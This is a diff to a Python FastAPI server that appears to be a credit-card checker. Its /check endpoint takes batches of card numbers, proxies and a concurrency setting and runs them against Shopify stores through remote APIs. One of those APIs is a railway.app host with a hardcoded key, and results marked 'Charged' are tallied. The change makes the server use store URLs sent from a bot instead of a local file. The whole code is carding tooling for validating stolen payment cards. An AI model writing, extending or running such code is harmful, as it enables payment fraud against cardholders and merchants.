@@ -14,45 +14,19 @@ SHOPIFY_APIS = {
     "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
 }
 
-# Load sites from sites_price.json (same directory as server)
-SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites_price.json")
-
-def load_sites():
-    try:
-        with open(SITES_FILE, "r") as f:
-            data = json.load(f)
-            # Could be a list or dict with "sites" key
-            if isinstance(data, list):
-                return data
-            elif isinstance(data, dict) and "sites" in data:
-                return data["sites"]
-            return data
-    except:
-        return [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
-
-def pick_best_sites(sites, min_price=0.0, max_price=999.0):
-    """Filter sites by price range"""
-    filtered = []
-    for s in sites:
-        url = s.get("url", "")
-        price = float(s.get("price", 0))
-        if url and min_price <= price <= max_price:
-            filtered.append(s)
-    return filtered if filtered else sites
-
 @app.post("/check")
 async def check_cards(data: dict):
     cards = data.get("cards", [])
-    site = data.get("site", "")
     proxy = data.get("proxy", "")
     api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
     concurrency = data.get("concurrency", 50)
-    min_price = data.get("min_price", 0.0)
-    max_price = data.get("max_price", 999.0)
+    sites = data.get("sites", [])  # sites sent from bot!
     
     api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
-    all_sites = load_sites()
-    available_sites = pick_best_sites(all_sites, min_price, max_price)
+    
+    # If no sites sent, use default
+    if not sites:
+        sites = [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
     
     results = []
     checked = 0
@@ -77,7 +51,7 @@ async def check_cards(data: dict):
                     break
                 
                 async with semaphore:
-                    result = await check_card_forever(session, api, card, available_sites)
+                    result = await check_card_forever(session, api, card, sites)
                     results.append(result)
                     checked += 1
                     if result["status"] == "Charged":
@@ -192,8 +166,7 @@ def extract_price(text):
 
 @app.get("/health")
 async def health():
-    sites = load_sites()
-    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys()), "sites_count": len(sites)}
+    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys())}
 
 if __name__ == "__main__":
     import uvicorn
